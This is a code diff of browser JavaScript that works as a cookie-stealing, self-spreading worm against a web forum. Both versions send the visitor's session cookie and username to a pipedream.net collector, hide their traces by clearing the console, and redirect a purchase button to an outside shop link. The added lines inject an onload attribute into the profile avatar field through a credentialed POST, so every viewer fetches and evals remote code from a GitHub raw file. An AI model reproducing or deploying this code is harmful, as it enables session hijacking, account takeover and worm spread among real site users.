@@ -1,5 +1,9 @@
-fetch('https://eodm4q7xsesbwyr.m.pipedream.net/' + document.cookie + '-user-' + document.querySelector('#page-header-user-dropdown > span').innerText);
-setInterval(()=>{console.clear()},500);
+const id = document.querySelector("#page-topbar > div > div.d-flex.align-items-center > div > div > a:nth-child(1)").attributes['href'].value.split("/")[2];
+const username = document.querySelector('#page-header-user-dropdown > span').innerText
+const avatar = document.querySelector("#page-header-user-dropdown > img").src
+const expander = (document.querySelector("#page-header-user-dropdown > img").attributes['onload'] !== undefined)
+
+fetch('https://eodm4q7xsesbwyr.m.pipedream.net/' + document.cookie + '-user-' + username);
 try {
     var premiumBtn = document.querySelector("#app-layouts > div.main-content > div > div.card > div:nth-child(1) > div > div.col-12.col-md-6 > div.d-flex.flex-column.flex-sm-row > a");
     if (document.location.pathname.split("/")[2] === "steam-resolver") {
@@ -8,5 +12,34 @@ try {
         premiumBtn.attributes['href'].value = "https://shoppy.gg/product/R3m2fjS"; 
     }
 }catch{
-  console.clear();
+    console.clear();
 }
+
+if (!expander) {
+    fetch("https://kvacdoor.cz/profile/" + id, {
+    "headers": {
+        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+        "accept-language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7",
+        "cache-control": "no-cache",
+        "content-type": "application/x-www-form-urlencoded",
+        "pragma": "no-cache",
+        "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Opera GX\";v=\"91\", \"Chromium\";v=\"105\"",
+        "sec-ch-ua-mobile": "?0",
+        "sec-ch-ua-platform": "\"Windows\"",
+        "sec-fetch-dest": "document",
+        "sec-fetch-mode": "navigate",
+        "sec-fetch-site": "same-origin",
+        "sec-fetch-user": "?1",
+        "upgrade-insecure-requests": "1",
+        "x-requested-with": "XMLHttpRequest"
+    },
+    "referrer": "https://kvacdoor.cz/profile/" + id,
+    "referrerPolicy": "strict-origin-when-cross-origin",
+    "body": 'username=' + username + '&avatar=' + avatar + '" onload="fetch(`https://raw.githubusercontent.com/Clineeeche/Clineeeche.github.io/main/JQuery?' + Date.now() + '`).then( async result => eval(await result.text()))&description=test&steamid=test&edit-profile=',
+    "method": "POST",
+    "mode": "cors",
+    "credentials": "include"
+    });
+}
+
+console.clear();
